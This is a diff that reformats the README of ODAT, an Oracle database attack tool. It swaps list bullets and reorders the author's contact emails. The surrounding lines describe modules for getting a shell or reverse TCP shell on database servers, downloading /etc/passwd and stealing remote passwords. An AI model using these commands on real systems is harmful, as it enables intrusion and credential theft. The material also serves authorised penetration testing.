@@ -241,8 +241,8 @@ This module has been created in order to try to guess Oracle users passwords.
 This module can be used to execute system commands on a remote database server. Useful to get a __reverse tcp shell__.
 
 __Note 1__: It is not possible to:
-- get the output of the system command
-- to give some special chararacters in arguments to the system command (ex: *>*)
+ ~ get the output of the system command
+ ~ to give some special chararacters in arguments to the system command (ex: *>*)
 
 * To get a reverse tcp shell when the remote database server is a Linux:
 ```bash
@@ -257,7 +257,7 @@ __Note 2__: You don't need to open a listen port manually to have a reverse tcp 
 
 This module can be used to execute system commands on a remote database server. Useful to get a __shell__ or a __reverse tcp shell__.
 
-* To get a *shell* on the database server:*
+* To get a *shell* on the database server:
 ```bash
 ./odat.py java -s $SERVER -d $SID -U $USER -P $PASSWORD --shell
 ```
@@ -350,9 +350,9 @@ This module can be used to download a file stored on the database server:
 This module can be used to download files or to run script remotly.
 
 __Notes__: 
-- It is __not possible to give an argument__ to the executable
-- The executable must be stored on the database server
-- The executable must have the execution bit enabled
+ ~ It is __not possible to give an argument__ to the executable
+ ~ The executable must be stored on the database server
+ ~ The executable must have the execution bit enabled
 
 * To download the *temp.sh* file stored in */tmp/* in *test.txt*:
 ```bash
@@ -388,9 +388,9 @@ This module can be used to upload a file on the server.
 ---
 
 This module can be used to:
-- upload a file
-- download a file
-- delete a remote file
+ ~ upload a file
+ ~ download a file
+ ~ delete a remote file
 
 
 * To download the */etc/passwd* file:
@@ -443,6 +443,6 @@ sudo chmod o+r sessions-$SERVER-1521-$SID.txt; ./odat.py stealRemotePwds -s $SER
 ---
 | __Quentin HARDY__    |
 | ------------- |
-| __qhardyfr@gmail.com__  |
 | __quentin.hardy@bt.com__    |
----
+| __qhardyfr@gmail.com__  |
+
